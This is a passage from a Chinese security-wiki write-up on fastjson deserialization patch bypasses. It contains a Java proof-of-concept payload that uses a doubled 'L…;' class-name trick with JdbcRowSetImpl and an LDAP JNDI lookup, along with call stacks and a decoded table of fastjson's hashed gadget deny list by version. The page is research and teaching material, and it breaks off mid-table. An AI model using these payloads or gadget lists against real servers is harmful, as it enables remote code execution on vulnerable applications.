parse<span class="token operator">:</span><span class="token number">152</span><span class="token punctuation">,</span> <span class="token constant">JSON</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">)</span>
parse<span class="token operator">:</span><span class="token number">162</span><span class="token punctuation">,</span> <span class="token constant">JSON</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">)</span>
parse<span class="token operator">:</span><span class="token number">131</span><span class="token punctuation">,</span> <span class="token constant">JSON</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">)</span>
main<span class="token operator">:</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token class-name">JdbcRowSetImplPoc</span> <span class="token punctuation">(</span>demo<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="绕过利用-二" tabindex="-1"><a class="header-anchor" href="#绕过利用-二"><span>绕过利用（二）</span></a></h3><p>‍</p><p>‍</p><h2 id="_1-2-25-1-2-42-补丁绕过" tabindex="-1"><a class="header-anchor" href="#_1-2-25-1-2-42-补丁绕过"><span>1.2.25 - 1.2.42 补丁绕过</span></a></h2><h3 id="调试分析" tabindex="-1"><a class="header-anchor" href="#调试分析"><span>调试分析</span></a></h3><p>修改 fastjson 的版本为 <code>1.2.42</code>​，运行上面的 poc 进行查看，报错 autoType is not support. Lcom.sun.rowset.JdbcRowSetImpl; 调试看看。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span>DefaultJSONParser</span>#parseObject
  <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span>ParserConfig</span>#checkAutoType
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240419141937-tgs8hd5.1325ac18.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240419142124-zzgimjk.53b5300f.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240419142242-edlnq3r.750525df.png" alt="image" loading="lazy">​</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token comment">// 调用栈</span>
checkAutoType<span class="token operator">:</span><span class="token number">925</span><span class="token punctuation">,</span> <span class="token class-name">ParserConfig</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>
parseObject<span class="token operator">:</span><span class="token number">311</span><span class="token punctuation">,</span> <span class="token class-name">DefaultJSONParser</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>
parse<span class="token operator">:</span><span class="token number">1338</span><span class="token punctuation">,</span> <span class="token class-name">DefaultJSONParser</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>
parse<span class="token operator">:</span><span class="token number">1304</span><span class="token punctuation">,</span> <span class="token class-name">DefaultJSONParser</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>
parse<span class="token operator">:</span><span class="token number">152</span><span class="token punctuation">,</span> <span class="token constant">JSON</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">)</span>
parse<span class="token operator">:</span><span class="token number">162</span><span class="token punctuation">,</span> <span class="token constant">JSON</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">)</span>
parse<span class="token operator">:</span><span class="token number">131</span><span class="token punctuation">,</span> <span class="token constant">JSON</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">)</span>
main<span class="token operator">:</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token class-name">JdbcRowSetImplPoc</span> <span class="token punctuation">(</span>demo<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="绕过利用" tabindex="-1"><a class="header-anchor" href="#绕过利用"><span>绕过利用</span></a></h3><p>那我们多加一层 L 和 ; 不就能绕过了吗？✌</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">demo</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">ParserConfig</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcRowSetImplPoc</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">&quot;{\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;, \&quot;autoCommit\&quot;:true}\n&quot;</span><span class="token punctuation">;</span>

        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240419142744-lklfiay.38ea69ed.png" alt="image" loading="lazy">​</p><h3 id="为什么在-1-2-42-之前也可以" tabindex="-1"><a class="header-anchor" href="#为什么在-1-2-42-之前也可以"><span>为什么在 1.2.42 之前也可以</span></a></h3><p>因为循环去除，所以 poc 多加几层 <code>L</code>​ 和 <code>;</code>​ 也是可以的。</p><p>处理逻辑：在 <code>L</code>​ 和 <code>;</code>​ 之间提取出类名后，会再次调用自身函数 <code>loadClass()</code>​，也就是说只要检测出 <code>L</code>​ 开头和 <code>;</code>​ 结尾的字符都会调用自身来循环提取出真正的类名。</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240419151443-ffpk6ii.d7991987.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240419151542-bd9iqk6.010bdb66.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240419151710-im25one.58fe858e.png" alt="image" loading="lazy">​</p><p><mark>这里注意到</mark> <mark>​<code>[</code>​</mark> <mark>开头的也会进行 loadClass，会不会是下一个修复绕过点呢？</mark></p><h2 id="哈希黑名单" tabindex="-1"><a class="header-anchor" href="#哈希黑名单"><span>哈希黑名单</span></a></h2><p>再来看看从 1.2.42 引入的哈希黑名单，从 <a href="https://github.com/alibaba/fastjson/commit/eebea031d4d6f0a079c3d26845d96ad50c3aaccd" target="_blank" rel="noopener noreferrer">1.2.42<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> 版本开始，Fastjson 把原本明文形式的黑名单改成了哈希过的黑名单，目的就是为了防止安全研究者对其进行研究，提高漏洞利用门槛。</p><p>通过对黑名单的研究，我们可以找到具体版本有哪些利用链可以利用。</p><p>已经有前人在 Github 上跑出了大部分黑名单包类，伟大无需多言：<a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener noreferrer">LeadroyaL/fastjson-blacklist (github.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><h3 id="背景" tabindex="-1"><a class="header-anchor" href="#背景"><span>背景</span></a></h3><p>​<code>fastjson</code>​ 在 1.2.42 开始，把原本明文的黑名单改成了哈希过的黑名单，防止安全研究者对其进行研究。在 <a href="https://github.com/alibaba/fastjson/commit/eebea031d4d6f0a079c3d26845d96ad50c3aaccd" target="_blank" rel="noopener noreferrer">https://github.com/alibaba/fastjson/commit/eebea031d4d6f0a079c3d26845d96ad50c3aaccd<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> 这次 commit 中体现出来。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token operator">-</span>     <span class="token keyword">private</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> denyList <span class="token operator">=</span> <span class="token string">&quot;bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.apache.xalan,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework&quot;</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">&quot;,&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">+</span>        denyHashCodes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">long</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
<span class="token operator">+</span>                <span class="token operator">-</span><span class="token number">8720046426850100497L</span><span class="token punctuation">,</span>
<span class="token operator">+</span>                 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token operator">+</span>                <span class="token number">8838294710098435315L</span>
<span class="token operator">+</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<code>fastjson</code>​ 在 1.2.61 开始，在 <a href="https://github.com/alibaba/fastjson/commit/d1c0dff9a33d49e6e7b98a4063da01bbc9325a38" target="_blank" rel="noopener noreferrer">https://github.com/alibaba/fastjson/commit/d1c0dff9a33d49e6e7b98a4063da01bbc9325a38<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> 中，<mark>把黑名单从十进制数变成了十六进制数</mark>，可能是为了防止安全研究者进行搜索，恕我直言有点可笑。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code>        denyHashCodes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">long</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
<span class="token operator">-</span>                <span class="token operator">-</span><span class="token number">8720046426850100497L</span><span class="token punctuation">,</span>
<span class="token operator">-</span>                <span class="token operator">-</span><span class="token number">8165637398350707645L</span><span class="token punctuation">,</span>
<span class="token operator">-</span>                <span class="token operator">-</span><span class="token number">8109300701639721088L</span><span class="token punctuation">,</span>

<span class="token operator">+</span>                <span class="token number">0</span>x86fc2bf9beaf7aefL<span class="token punctuation">,</span>
<span class="token operator">+</span>                <span class="token number">0</span>x8eadd40cb2a94443L<span class="token punctuation">,</span>
<span class="token operator">+</span>                <span class="token number">0</span>x8f75f9fa0df03f80L<span class="token punctuation">,</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<code>fastjson</code>​ 在 1.2.62 开始，<a href="https://github.com/alibaba/fastjson/commit/014444e6c62329ec7878bb6b0c6b28c3f516c54e" target="_blank" rel="noopener noreferrer">https://github.com/alibaba/fastjson/commit/014444e6c62329ec7878bb6b0c6b28c3f516c54e<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> 中，从小写改成了大写，可能是为了规范吧。</p><h3 id="目前已知的列表" tabindex="-1"><a class="header-anchor" href="#目前已知的列表"><span>目前已知的列表</span></a></h3><table><thead><tr><th>version</th><th>hash</th><th>hex-hash</th><th>name</th></tr></thead><tbody><tr><td>1.2.42</td><td>-8720046426850100497</td><td>0x86fc2bf9beaf7aefL</td><td>org.apache.commons.collections4.comparators</td></tr><tr><td>1.2.42</td><td>-8109300701639721088</td><td>0x8f75f9fa0df03f80L</td><td>org.python.core</td></tr><tr><td>1.2.42</td><td>-7966123100503199569</td><td>0x9172a53f157930afL</td><td>org.apache.tomcat</td></tr><tr><td>1.2.42</td><td>-7766605818834748097</td><td>0x9437792831df7d3fL</td><td>org.apache.xalan</td></tr><tr><td>1.2.42</td><td>-6835437086156813536</td><td>0xa123a62f93178b20L</td><td>javax.xml</td></tr><tr><td>1.2.42</td><td>-4837536971810737970</td><td>0xbcdd9dc12766f0ceL</td><td>org.springframework.</td></tr><tr><td>1.2.42</td><td>-4082057040235125754</td><td>0xc7599ebfe3e72406L</td><td>org.apache.commons.beanutils</td></tr><tr><td>1.2.42</td><td>-2364987994247679115</td><td>0xdf2ddff310cdb375L</td><td>org.apache.commons.collections.Transformer</td></tr><tr><td>1.2.42</td><td>-1872417015366588117</td><td>0xe603d6a51fad692bL</td><td>org.codehaus.groovy.runtime</td></tr><tr><td>1.2.42</td><td>-254670111376247151</td><td>0xfc773ae20c827691L</td><td>java.lang.Thread</td></tr><tr><td>1.2.42</td><td>-190281065685395680</td><td>0xfd5bfc610056d720L</td><td>javax.net.</td></tr><tr><td>1.2.42</td><td>313864100207897507</td><td>0x45b11bc78a3aba3L</td><td>com.mchange</td></tr><tr><td>1.2.42</td><td>1203232727967308606</td><td>0x10b2bdca849d9b3eL</td><td>org.apache.wicket.util</td></tr><tr><td>1.2.42</td><td>1502845958873959152</td><td>0x14db2e6fead04af0L</td><td>java.util.jar.</td></tr><tr><td>1.2.42</td><td>3547627781654598988</td><td>0x313bb4abd8d4554cL</td><td>org.mozilla.javascript</td></tr><tr><td>1.2.42</td><td>3730752432285826863</td><td>0x33c64b921f523f2fL</td><td>java.rmi</td></tr><tr><td>1.2.42</td><td>3794316665763266033</td><td>0x34a81ee78429fdf1L</td><td>java.util.prefs.</td></tr><tr><td>1.2.42</td><td>4147696707147271408</td><td>0x398f942e01920cf0L</td><td>com.sun.</td></tr><tr><td>1.2.42</td><td>5347909877633654828</td><td>0x4a3797b30328202cL</td><td>java.util.logging.</td></tr><tr><td>1.2.42</td><td>5450448828334921485</td><td>0x4ba3e254e758d70dL</td><td>org.apache.bcel</td></tr><tr><td>1.2.42</td><td>5751393439502795295</td><td>0x4fd10ddc6d13821fL</td><td>java.net.Socket</td></tr><tr><td>1.2.42</td><td>5944107969236155580</td><td>0x527db6b46ce3bcbcL</td><td>org.apache.commons.fileupload</td></tr><tr><td>1.2.42</td><td>6742705432718011780</td><td>0x5d92e6ddde40ed84L</td><td>org.jboss</td></tr><tr><td>1.2.42</td><td>7179336928365889465</td><td>0x63a220e60a17c7b9L</td><td>org.hibernate</td></tr><tr><td>1.2.42</td><td>7442624256860549330</td><td>0x6749835432e0f0d2L</td><td>org.apache.commons.collections.functors</td></tr><tr><td>1.2.42</td><td>8838294710098435315</td><td>0x7aa7ee3627a19cf3L</td><td>org.apache.myfaces.context.servlet</td></tr><tr><td>1.2.43</td><td>-2262244760619952081</td><td>0xe09ae4604842582fL</td><td>java.net.URL</td></tr><tr><td>1.2.46</td><td>-8165637398350707645</td><td>0x8eadd40cb2a94443L</td><td>junit.</td></tr><tr><td>1.2.46</td><td>-8083514888460375884</td><td>0x8fd1960988bce8b4L</td><td>org.apache.ibatis.datasource</td></tr><tr><td>1.2.46</td><td>-7921218830998286408</td><td>0x92122d710e364fb8L</td><td>org.osjava.sj.</td></tr><tr><td>1.2.46</td><td>-7768608037458185275</td><td>0x94305c26580f73c5L</td><td>org.apache.log4j.</td></tr><tr><td>1.2.46</td><td>-6179589609550493385</td><td>0xaa3daffdb10c4937L</td><td>org.logicalcobwebs.</td></tr><tr><td>1.2.46</td><td>-5194641081268104286</td><td>0xb7e8ed757f5d13a2L</td><td>org.apache.logging.</td></tr><tr><td>1.2.46</td><td>-3935185854875733362</td><td>0xc963695082fd728eL</td><td>org.apache.commons.dbcp</td></tr><tr><td>1.2.46</td><td>-2753427844400776271</td><td>0xd9c9dbf6bbd27bb1L</td><td>com.ibatis.sqlmap.engine.datasource</td></tr><tr><td>1.2.46</td><td>-1589194880214235129</td><td>0xe9f20bad25f60807L</td><td>org.jdom.</td></tr><tr><td>1.2.46</td><td>1073634739308289776</td><td>0xee6511b66fd5ef0L</td><td>org.slf4j.</td></tr><tr><td>1.2.46</td><td>5688200883751798389</td><td>0x4ef08c90ff16c675L</td><td>javassist.</td></tr><tr><td>1.2.46</td><td>7017492163108594270</td><td>0x616323f12c2ce25eL</td><td>oracle.net</td></tr><tr><td>1.2.46</td><td>8389032537095247355</td><td>0x746bd4a53ec195fbL</td><td>org.jaxen.</td></tr><tr><td>1.2.48</td><td>1459860845934817624</td><td>0x144277b467723158L</td><td>java.net.InetAddress</td></tr><tr><td>1.2.48</td><td>8409640769019589119</td><td>0x74b50bb9260e31ffL</td><td>java.lang.Class</td></tr><tr><td>1.2.49</td><td>4904007817188630457</td><td>0x440e89208f445fb9L</td><td>com.alibaba.fastjson.annotation</td></tr><tr><td>1.2.59</td><td>5100336081510080343</td><td>0x46c808a4b5841f57L</td><td>org.apache.cxf.jaxrs.provider.</td></tr><tr><td>1.2.59</td><td>6456855723474196908</td><td>0x599b5c1213a099acL</td><td>ch.qos.logback.</td></tr><tr><td>1.2.59</td><td>8537233257283452655</td><td>0x767a586a5107feefL</td><td>net.sf.ehcache.transaction.manager.</td></tr><tr><td>1.2.60</td><td>3688179072722109200</td><td>0x332f0b5369a18310L</td><td>com.zaxxer.hikari.</td></tr><tr><td>1.2.61</td><td>-4401390804044377335</td><td>0xc2eb1e621f439309L</td><td>flex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor</td></tr><tr><td>1.2.61</td><td>-1650485814983027158</td><td>0xe9184be55b1d962aL</td><td>org.apache.openjpa.ee.</td></tr><tr><td>1.2.61</td><td>-1251419154176620831</td><td>0xeea210e8da2ec6e1L</td><td>oracle.jdbc.rowset.OracleJDBCRowSet</td></tr><tr><td>1.2.61</td><td>-9822483067882491</td><td>0xffdd1a80f1ed3405L</td><td>com.mysql.cj.jdbc.admin.</td></tr><tr><td>1.2.61</td><td>99147092142056280</td><td>0x1603dc147a3e358L</td><td>oracle.jdbc.connector.OracleManagedConnectionFactory</td></tr><tr><td>1.2.61</td><td>3114862868117605599</td><td>0x2b3a37467a344cdfL</td><td>org.apache.ibatis.parsing.</td></tr><tr><td>1.2.61</td><td>4814658433570175913</td><td>0x42d11a560fc9fba9L</td><td>org.apache.axis2.jaxws.spi.handler.</td></tr><tr><td>1.2.61</td><td>6511035576063254270</td><td>0x5a5bd85c072e5efeL</td><td>jodd.db.connection.</td></tr><tr><td>1.2.61</td><td>8925522461579647174</td><td>0x7bddd363ad3998c6L</td><td>org.apache.commons.configuration.JNDIConfiguration</td></tr><tr><td>1.2.62</td><td>-9164606388214699518</td><td>0x80d0c70bcc2fea02L</td><td>org.apache.ibatis.executor.</td></tr><tr><td>1.2.62</td><td>-8649961213709896794</td><td>0x87f52a1b07ea33a6L</td><td>net.sf.cglib.</td></tr><tr><td>1.2.62</td><td>-6316154655839304624</td><td>0xa85882ce1044c450L</td><td>oracle.net.</td></tr><tr><td>1.2.62</td><td>-5764804792063216819</td><td>0xafff4c95b99a334dL</td><td>com.mysql.cj.jdbc.MysqlDataSource</td></tr><tr><td>1.2.62</td><td>-4608341446948126581</td><td>0xc00be1debaf2808bL</td><td>jdk.internal.</td></tr><tr><td>1.2.62</td><td>-4438775680185074100</td><td>0xc2664d0958ecfe4cL</td><td>aj.org.objectweb.asm.</td></tr><tr><td>1.2.62</td><td>-3319207949486691020</td><td>0xd1efcdf4b3316d34L</td><td>oracle.jdbc.</td></tr><tr><td>1.2.62</td><td>-2192804397019347313</td><td>0xe1919804d5bf468fL</td><td>org.apache.commons.collections.comparators.</td></tr><tr><td>1.2.62</td><td>-2095516571388852610</td><td>0xe2eb3ac7e56c467eL</td><td>net.sf.ehcache.hibernate.</td></tr><tr><td>1.2.62</td><td>4750336058574309</td><td>0x10e067cd55c5e5L</td><td>com.mysql.cj.log.</td></tr><tr><td>1.2.62</td><td>218512992947536312</td><td>0x3085068cb7201b8L</td><td>org.h2.jdbcx.</td></tr><tr><td>1.2.62</td><td>823641066473609950</td><td>0xb6e292fa5955adeL</td><td>org.apache.commons.logging.</td></tr><tr><td>1.2.62</td><td>1534439610567445754</td><td>0x154b6cb22d294cfaL</td><td>org.apache.ibatis.reflection.</td></tr><tr><td>1.2.62</td><td>1818089308493370394</td><td>0x193b2697eaaed41aL</td><td>org.h2.server.</td></tr><tr><td>1.2.62</td><td>2164696723069287854</td><td>0x1e0a8c3358ff3daeL</td><td>org.apache.ibatis.datasource.</td></tr><tr><td>1.2.62</td><td>2653453629929770569</td><td>0x24d2f6048fef4e49L</td><td>org.objectweb.asm.</td></tr><tr><td>1.2.62</td><td>2836431254737891113</td><td>0x275d0732b877af29L</td><td>flex.messaging.util.concurrent.</td></tr><tr><td>1.2.62</td><td>3089451460101527857</td><td>0x2adfefbbfe29d931L</td><td>org.apache.ibatis.javassist.</td></tr><tr><td>1.2.62</td><td>3256258368248066264</td><td>0x2d308dbbc851b0d8L</td><td>java.lang.UNIXProcess</td></tr><tr><td>1.2.62</td><td>3718352661124136681</td><td>0x339a3e0b6beebee9L</td><td>org.apache.ibatis.ognl.</td></tr><tr><td>1.2.62</td><td>4046190361520671643</td><td>0x3826f4b2380c8b9bL</td><td>com.mysql.cj.jdbc.MysqlConnectionPoolDataSource</td></tr><tr><td>1.2.62</td><td>4841947709850912914</td><td>0x43320dc9d2ae0892L</td><td>org.codehaus.jackson.</td></tr><tr><td>1.2.62</td><td>6280357960959217660</td><td>0x5728504a6d454ffcL</td><td>org.apache.ibatis.scripting.</td></tr><tr><td>1.2.62</td><td>6534946468240507089</td><td>0x5ab0cb3071ab40d1L</td><td>org.apache.commons.proxy.</td></tr><tr><td>1.2.62</td><td>6734240326434096246</td><td>0x5d74d3e5b9370476L</td><td>com.mysql.cj.jdbc.MysqlXADataSource</td></tr><tr><td>1.2.62</td><td>7123326897294507060</td><td>0x62db241274397c34L</td><td>org.apache.commons.collections.functors.</td></tr><tr><td>1.2.62</td><td>8488266005336625107</td><td>0x75cc60f5871d0fd3L</td><td>org.apache.commons.configuration</td></tr><tr><td>1.2.66</td><td>-2439930098895578154</td><td>0xde23a0809a8b9bd6L</td><td>javax.script.</td></tr><tr><td>1.2.66</td><td>-582813228520337988</td><td>0xf7e96e74dfa58dbcL</td><td>javax.sound.</td></tr><tr><td>1.2.66</td><td>-26639035867733124</td><td>0xffa15bf021f1e37cL</td><td>javax.print.</td></tr><tr><td>1.2.66</td><td>386461436234701831</td><td>0x55cfca0f2281c07L</td><td>javax.activation.</td></tr><tr><td>1.2.66</td><td>1153291637701043748</td><td>0x100150a253996624L</td><td>javax.tools.</td></tr><tr><td>1.2.66</td><td>1698504441317515818L</td><td>0x17924cca5227622aL</td><td>javax.management.</td></tr><tr><td>1.2.66</td><td>7375862386996623731L</td><td>0x665c53c311193973L</td><td>org.apache.xbean.</td></tr><tr><td>1.2.66</td><td>7658177784286215602L</td><td>0x6a47501ebb2afdb2L</td><td>org.eclipse.jetty.</td></tr><tr><td>1.2.66</td><td>8055461369741094911L</td><td>0x6fcabf6fa54cafffL</td><td>javax.naming.</td></tr><tr><td>1.2.67</td><td>-7775351613326101303L</td><td>0x941866e73beff4c9L</td><td>org.apache.shiro.realm.</td></tr><tr><td>1.2.67</td><td>-6025144546313590215L</td><td>0xac6262f52c98aa39L</td><td>org.apache.http.conn.</td></tr><tr><td>1.2.67</td><td>-5939269048541779808L</td><td>0xad937a449831e8a0L</td><td>org.quartz.</td></tr><tr><td>1.2.67</td><td>-5885964883385605994L</td><td>0xae50da1fad60a096L</td><td>com.taobao.eagleeye.wrapper</td></tr><tr><td>1.2.67</td><td>-3975378478825053783L</td><td>0xc8d49e5601e661a9L</td><td>org.apache.http.impl.</td></tr><tr><td>1.2.67</td><td>-2378990704010641148L</td><td>0xdefc208f237d4104L</td><td>com.ibatis.</td></tr><tr><td>1.2.67</td><td>-905177026366752536L</td><td>0xf3702a4a5490b8e8L</td><td>org.apache.catalina.</td></tr><tr><td>1.2.67</td><td>2660670623866180977L</td><td>0x24ec99d5e7dc5571L</td><td>org.apache.http.auth.</td></tr><tr><td>1.2.67</td><td>2731823439467737506L</td><td>0x25e962f1c28f71a2L</td><td>br.com.anteros.</td></tr><tr><td>1.2.67</td><td>3637939656440441093L</td><td>0x327c8ed7c8706905L</td><td>com.caucho.</td></tr><tr><td>1.2.67</td><td>4254584350247334433L</td><td>0x3b0b51ecbf6db221L</td><td>org.apache.http.cookie.</td></tr><tr><td>1.2.67</td><td>5274044858141538265L</td><td>0x49312bdafb0077d9L</t